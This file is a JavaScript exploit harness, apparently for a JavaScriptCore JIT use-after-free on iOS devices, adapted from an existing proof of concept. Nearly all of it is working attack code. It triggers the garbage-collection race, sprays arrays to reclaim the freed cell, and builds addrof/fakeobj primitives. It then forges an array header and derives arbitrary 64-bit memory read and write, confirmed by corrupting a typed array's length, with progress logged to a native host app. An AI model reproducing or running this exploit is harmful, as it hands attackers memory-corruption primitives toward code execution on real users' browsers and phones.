(function () {
  var out = { step: [], exp: {}, guard: [], phase: 'start' };
  function guard(name, fn) {
    out.phase = name;
    try { fn(); out.step.push(name + ':ok'); return true; }
    catch (e) {
      var m = 'no message';
      try { m = String(e); } catch (e2) { m = 'unstringifiable'; }
      out.guard.push(name + ': ' + m);
      out.step.push(name + ':FAILED');
      // report the failure the moment it happens: a phase error is diagnostic
      // gold and must survive even if the run is killed later
      aveStep('PHASE ' + name + ' FAILED: ' + m);
      return false;
    }
  }

  var ab = new ArrayBuffer(8), u = new BigUint64Array(ab), d = new Float64Array(ab);
  var itof = function (v) { u[0] = v; return d[0]; };
  var ftoi = function (f) { d[0] = f; return u[0]; };
  var OFF = 0x0002000000000000n;
  var HDR = 0x07n | (0x2Bn << 40n) | (1n << 56n);   // ArrayWithDouble | ArrayType | White

  // The PoC's own acquireRW() loops 15000 times.  Our first complete run only
  // got 647 rounds in a 60 s budget (93 ms/round -- verified on device), so the
  // budget is what decides whether the reclaim ever gets its chance, not the
  // mechanism.  10 minutes = ~6400 honest attempts.
  var BUDGET = 220000, t0 = Date.now(), rounds = 0;
  var arr, arr_index, W = null, HA, SA, gap, changeArr, holder, scribble;

  function foo(flag, k, allocCount) {
    let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
    arr[arr_index] = A; let forGC = [];
    let a = new Date(1111); a[0] = 1.1;
    // 1 MB units, as the PoC tuned them: at 8 MB the allocation counter overshoots
    // JSC's collection threshold in huge steps and pins whatever has not been
    // reclaimed (the PoC measured 597-776 MB peak and lost 17 of 20 runs).
    for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x100000));
    A.p2 = forGC;
    let b = { p0: 0x42424242, p1: 1.1 };
    let f; f = b; if (flag) { f = 1.1; }
    A.p1 = f; let v = 1.1;
    for (let i = 0; i < 1e6; ++i) { for (let j = 0; j < k; ++j) { v = i; v = j; } }
    b.p0 = v; b.p1 = a;
  }
  function rec(n) { if (n === 0) return; n = n | 0; rec(n - 1); }
  // The PoC drives the GC with an 800-frame recursion wrapped in try/catch, NOT
  // a 10000-frame one.  (Our 10000 version is what produced
  //  "RangeError: Maximum call stack size exceeded" on every device.)
  function safeRec() { try { rec(800); } catch (e) { } }
  var reclaimed = [];    // the sprayed arrays are KEPT alive, as in the PoC

  guard('carrier', function () {
    arr = new Array(0x400000).fill(1.1);
    arr_index = arr.length - 1;
  });

  // Warmup: exactly the PoC's acquireRW() prologue -- two triggerUAF calls, 1000
  // cheap ones, then twenty 800-frame GC recursions (each in a try/catch, so a
  // RangeError can never abort the run).
  aveStep('init: carrier allocated, warming up the JIT (the one-time slow phase)');
  guard('warmup', function () {
    foo(true, 1, 1); foo(false, 1, 1);
    for (let i = 0; i < 1000; ++i) foo(false, 0, 0);
    for (let i = 0; i < 20; ++i) safeRec();
  });
  out.exp.warmupMs = Date.now() - t0;
  aveStep('warmup done in ' + out.exp.warmupMs + 'ms, warnings=' + out.guard.length +
          ', starting the trigger hunt');

  guard('hunt', function () {
    for (let k = 0; k < 10000 && !W; ++k) {
      rounds = k + 1;
      // The PoC's per-round dynamics: foo() with the full inner loop (JIT warmup +
      // the OSR'd function that mispredicts), an 800-frame GC recursion, 3 small
      // buffers, then a 64-array reclaim spray.
      foo(false, 10, k % 5 + 1);
      safeRec();
      for (let i = 0; i < 3; ++i) new ArrayBuffer(0x4000);
      let fr = arr[arr_index].p1.p1;
      let noCow = 13.37;
      // The PoC sprays 64 arrays per round and KEEPS them (reclaimed) so the cell it
      // targets stays occupied by our memory -- dropping them lets anything reuse it.
      for (let i = 0; i < 64; ++i) {
        let c = [13.37, 2.2, 3.3, 4.4, noCow];
        reclaimed.push(c);
        try { if (fr[0] === 13.37) { W = { freed: fr, boxed: c, round: k }; break; } } catch (e) { }
      }
      if (k % 25 === 24) aveStep('hunt round=' + rounds +
                                  ' elapsed=' + (Date.now() - t0) + 'ms trigger=no');
      if (Date.now() - t0 > BUDGET) { out.exp.budgetReached = true; break; }
    }
  });
  out.exp.rounds = rounds;
  aveStep('post-loop: rounds=' + rounds);
  out.exp.huntMs = Date.now() - t0;
  aveStep('post-loop: huntMs=' + out.exp.huntMs);
  aveStep('hunt finished: rounds=' + rounds + ' in ' + out.exp.huntMs +
          'ms, trigger=' + (W ? 'FIRED at round ' + W.round : 'no'));

  function addrof(o) { W.boxed[0] = o; return ftoi(W.freed[0]); }
  function fakeobj(a) { W.freed[0] = itof(a); return W.boxed[0]; }

  guard('groom', function () {
    if (!W) throw 'trigger did not fire';
    holder   = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
    scribble = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
    HA = addrof(holder), SA = addrof(scribble), gap = SA - HA;
    for (var t = 0; t < 60 && gap !== 0x40n && gap !== -0x40n; t++) {
      holder   = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
      scribble = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
      HA = addrof(holder); SA = addrof(scribble); gap = SA - HA;
    }
    out.gap = gap.toString();
    if (gap !== 0x40n && gap !== -0x40n) throw 'groom failed';
    out.step.push('groom ok gap=' + gap);
  });

  guard('primitive', function () {
    if (gap !== 0x40n && gap !== -0x40n) throw 'no groomed pair';
    scribble.p7 = 3.3; scribble[0] = 1.1;
    holder.p1 = itof(HDR);
    holder.p2 = scribble;
    changeArr = fakeobj(HA - 1n + 0x10n + 1n);
    function setBtf(a) { changeArr[1] = itof(BigInt(a) + 0x10n); }

    // E2: does the element fast path ignore StructureID?
    var HDR_JUNK = HDR | 0xdeadbeefn;
    holder.p1 = itof(HDR_JUNK);
    var junkEl = null;
    try { junkEl = ftoi(changeArr[0]); } catch (e) { junkEl = 'threw'; }
    out.exp.elementPathIgnoresSID = (junkEl !== 'threw');
    holder.p1 = itof(HDR);

    function write64(addr, val) {
      setBtf(BigInt(addr));
      try { scribble.p7 = itof(BigInt.asUintN(64, BigInt(val))); return true; } catch (e) { return false; }
    }
    function read64(addr) {
      setBtf(BigInt(addr));
      try { return BigInt(ftoi(changeArr[0])); } catch (e) { return null; }
    }

    var ta = new BigUint64Array(16);
    ta[0] = 0x4142434445464748n;
    var w = write64(addrof(ta) - 1n + 0x18n, 0x0000000000010000n);
    out.lengthWrite = w;
    out.lengthAfter = ta.length;
    out.write = (w && ta.length === 65536);
    out.read = (ta[0] === 0x4142434445464748n);
    out.value = '0x' + ta[0].toString(16);
    out.step.push('primitive: write=' + out.write + ' read=' + out.read);
  });

  aveStep('phases: ' + out.step.join(' | '));
  var answer = JSON.stringify(out);
  // post the answer from inside the script too, so it is in the log even if
  // the return trip through Objective-C never completes
  aveStep('RESULT ' + answer);
  // Hold the thread for a moment BEFORE returning: the ObjC side formats the
  // result the instant evaluateScript: returns, and the verdict POSTs are
  // asynchronous.  Without this hold the last lines are still in flight when
  // the app dies and the verdict is lost with them.
  var hold0 = Date.now();
  while (Date.now() - hold0 < 4000) { }
  return answer;
})()

